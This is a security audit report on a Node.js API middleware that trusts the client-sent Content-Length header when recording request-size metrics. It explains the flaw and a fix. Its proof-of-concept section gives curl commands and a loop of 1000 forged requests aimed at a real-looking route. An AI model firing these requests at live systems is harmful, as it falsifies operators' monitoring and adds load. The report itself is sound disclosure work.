# Audit Report

## Title
Unauthenticated Content-Length Header Injection Corrupts Request Size Histogram Metrics

## Summary
The `metricsMiddleware` in `rest/middleware/metricsHandler.js` records the raw, client-supplied `Content-Length` header value directly into the `api_request_size_bytes` OpenTelemetry histogram with no upper-bound validation. Any unauthenticated caller can permanently skew the histogram distribution for any route by sending a single request with a crafted `Content-Length` header.

## Finding Description
**Vulnerable line** — `rest/middleware/metricsHandler.js:209`:
```js
requestSizeHistogram.record(parseInt(req.headers['content-length'] ?? '0', 10) || 0, labels);
```
`parseInt('9999999999', 10)` returns the JavaScript number `9999999999`. This is a valid, non-`NaN`, non-zero value, so the `|| 0` fallback never activates. There is no clamp, no comparison against the actual received body bytes, and no rejection of implausible values.

The middleware is registered globally at `rest/server.js:88–92` via `app.useExt(metricsHandler())`, before all route handlers and before any body-size enforcement. Every request — including unauthenticated `GET` requests — passes through it.

`express.json()` and `express.urlencoded()` enforce body-parsing limits but do not rewrite or reject the raw `Content-Length` header value accessible via `req.headers`.

## Impact Explanation
The `api_request_size_bytes` Prometheus histogram is corrupted for any targeted route. The histogram's bucket counts, sum, and derived statistics (mean, percentiles) become meaningless for that route. Operators relying on these metrics for capacity planning, anomaly detection, or SLA monitoring receive false data. Repeated injection permanently skews the distribution; there is no self-healing mechanism in OpenTelemetry histograms. No funds, protocol state, or user data are affected — the impact is confined to observability integrity.

## Likelihood Explanation
Exploitation requires zero authentication, zero special tooling, and zero knowledge beyond the public API surface. A single `curl` command suffices:
```
curl -H "Content-Length: 9999999999" https://<host>/api/v1/contracts
```
The attack is trivially repeatable at high frequency, amplifying metric corruption. Any internet-accessible deployment is exposed.

## Recommendation
Replace the header-based measurement with the actual received body size. The middleware already intercepts `res.write`/`res.end` to measure response size accurately; apply the same pattern to the request body:

```js
// Track actual received bytes instead of trusting the header
let requestSize = 0;
req.on('data', (chunk) => { requestSize += Buffer.isBuffer(chunk) ? chunk.length : Buffer.byteLength(chunk); });

res.on('finish', () => {
  // ...
  requestSizeHistogram.record(requestSize, labels);
});
```

If header-based measurement must be retained for performance reasons, apply a strict upper-bound clamp (e.g., cap at the configured body size limit) and validate that the value is a non-negative finite integer before recording.

## Proof of Concept
```bash
# Single request — inflates the histogram sum for the contracts route by ~9.3 GB
curl -s -o /dev/null -w "%{http_code}" \
  -H "Content-Length: 9999999999" \
  https://<mirror-node-host>/api/v1/contracts

# Scripted loop — permanently corrupts the distribution
for i in $(seq 1 1000); do
  curl -s -o /dev/null -H "Content-Length: 9999999999" \
    https://<mirror-node-host>/api/v1/contracts &
done
wait

# Verify corruption in Prometheus metrics endpoint
curl https://<mirror-node-host>/swagger/metrics/ | grep api_request_size_bytes
# Expected: _sum for {method="GET",path="/api/v1/contracts"} will show a massively inflated value
```
